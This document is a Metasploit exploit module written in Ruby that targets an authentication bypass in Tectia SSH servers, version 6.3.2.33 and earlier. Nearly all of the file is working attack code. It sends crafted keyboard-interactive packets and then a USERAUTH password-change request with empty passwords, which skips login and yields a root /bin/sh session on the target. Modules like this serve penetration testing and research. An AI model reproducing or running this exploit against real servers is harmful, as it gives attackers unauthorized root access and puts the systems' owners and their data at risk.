##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Tectia SSH USERAUTH Change Request Password Reset Vulnerability",
			'Description'    => %q{
					This module exploits a vulnerability in Tectia SSH server for Unix-based
				platforms.  The bug is caused by a SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ request
				before password authentication, allowing any remote user to bypass the login
				routine, and then gain access as root.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'kingcope',  #Original 0day
					'bperry',
					'sinn3r'
				],
			'References'     =>
				[
					['EDB', '23082'],
					['URL', 'http://seclists.org/fulldisclosure/2012/Dec/12']
				],
			'Payload'        =>
				{
					'Compat' =>
					{
						'PayloadType'    => 'cmd_interact',
						'ConnectionType' => 'find'
					}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					['Unix-based Tectia SSH 6.3.2.33 or prior', {}],
				],
			'Privileged'     => true,
			'DisclosureDate' => "Dec 01 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(22),
				OptString.new('USERNAME', [true, 'The username to login as', 'root'])
			], self.class
		)

		register_advanced_options(
			[
				OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
				OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
			]
		)
	end

	def check
		connect
		banner = sock.get_once
		print_status("#{rhost}:#{rport} - #{banner}")
		disconnect

		return Exploit::CheckCode::Appears if banner =~ /SSH Tectia/
		return Exploit::CheckCode::Safe
	end

	def rhost
		datastore['RHOST']
	end

	def rport
		datastore['RPORT']
	end

	#
	# This is where the login begins.  We're expected to use the keyboard-interactive method to
	# authenticate, but really all we want is skipping it so we can move on to the password
	# method authentication.
	#
	def auth_keyboard_interactive(user, transport)
		print_status("#{rhost}:#{rport} - Going through keyboard-interactive auth...")
		auth_req_pkt = Net::SSH::Buffer.from(
			:byte, 0x32,                     #userauth request
			:string, user,                   #username
			:string, "ssh-connection",       #service
			:string, "keyboard-interactive", #method name
			:string, "",                     #lang
			:string, ""
		)

		user_auth_pkt = Net::SSH::Buffer.from(
			:byte, 0x3D,                     #userauth info
			:raw, 0x01,                      #number of prompts
			:string, "",                     #password
			:raw, "\0"*32                    #padding
		)

		transport.send_message(auth_req_pkt)
		message = transport.next_message
		vprint_status("#{rhost}:#{rport} - Authentication to continue: keyboard-interactive")

		message = transport.next_message
		vprint_status("#{rhost}:#{rport} - Password prompt: #{message.inspect}")

		# USERAUTH INFO
		transport.send_message(user_auth_pkt)
		message = transport.next_message
		vprint_status("#{rhost}:#{rport} - Auths that can continue: #{message.inspect}")

		2.times do |i|
			#USRAUTH REQ
			transport.send_message(auth_req_pkt)
			message = transport.next_message
			vprint_status("#{rhost}:#{rport} - Password prompt: #{message.inspect}")

			# USERAUTH INFO
			transport.send_message(user_auth_pkt)
			message = transport.next_message
			vprint_status("#{rhost}:#{rport} - Auths that can continue: #{message.inspect}")
		end
	end


	#
	# The following link is useful to understand how to craft the USERAUTH password change
	# request packet:
	# http://fossies.org/dox/openssh-6.1p1/sshconnect2_8c_source.html#l00903
	#
	def userauth_passwd_change(user, transport, connection)
		print_status("#{rhost}:#{rport} - Sending USERAUTH Change request...")
		pkt = Net::SSH::Buffer.from(
			:byte, 0x32,               #userauth request
			:string, user,             #username
			:string, "ssh-connection", #service
			:string, "password"        #method name
		)
		pkt.write_bool(true)
		pkt.write_string("")           #Old pass
		pkt.write_string("")           #New pass

		transport.send_message(pkt)
		message = transport.next_message.type
		vprint_status("#{rhost}:#{rport} - Auths that can continue: #{message.inspect}")

		if message.to_i == 52 #SSH2_MSG_USERAUTH_SUCCESS
			transport.send_message(transport.service_request("ssh-userauth"))
			message = transport.next_message.type

			if message.to_i == 6 #SSH2_MSG_SERVICE_ACCEPT
				shell = Net::SSH::CommandStream.new(connection, '/bin/sh', true)
				connection = nil
				return shell
			end
		end
	end

	def do_login(user)
		opts       = {:user=>user, :record_auth_info=>true}
		options    = Net::SSH::Config.for(rhost, Net::SSH::Config.default_files).merge(opts)
		transport  = Net::SSH::Transport::Session.new(rhost, options)
		connection = Net::SSH::Connection::Session.new(transport, options)
		auth_keyboard_interactive(user, transport)
		userauth_passwd_change(user, transport, connection)
	end

	def exploit
		# Our keyboard-interactive is specific to Tectia.  This allows us to run quicker when we're
		# engaging a variety of SSHD targets on a network.
		if check != Exploit::CheckCode::Appears
			print_error("#{rhost}:#{rport} - Host does not seem vulnerable, will not engage.")
			return
		end

		c = nil

		begin
			::Timeout.timeout(datastore['SSH_TIMEOUT']) do
				c = do_login(datastore['USERNAME'])
			end
		rescue Rex::ConnectionError, Rex::AddressInUse
			return
		rescue Net::SSH::Disconnect, ::EOFError
			print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
			return
		rescue Net::SSH::Exception => e
			print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
			return
		rescue ::Timeout::Error
			print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
			return
		end

		handler(c.lsock) if c
	end
end
